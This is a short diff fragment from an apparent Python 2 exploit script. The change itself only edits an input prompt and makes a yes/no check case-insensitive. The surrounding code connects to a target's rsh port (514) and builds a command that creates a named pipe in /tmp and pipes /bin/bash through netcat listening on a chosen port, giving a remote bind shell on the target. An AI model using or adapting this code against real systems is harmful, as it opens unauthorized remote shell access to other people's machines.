@@ -36,9 +36,9 @@ test = s.recv(1024)
 print test
 s.close()
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-user = raw_input('Do You Want A Bind Shell? Y/n: ')
+user = raw_input('Do You Want A Bind Shell? y/n: ')
 
-if user =="y":
+if user.lower() =="y":
     s.bind(('0.0.0.0', myport))
     s.connect((host,514))
     command  = 'mknod /tmp/backpipe p ; /bin/bash 0</tmp/backpipe | nc -nlvp %s 1>/tmp/backpipe'% (bindport)
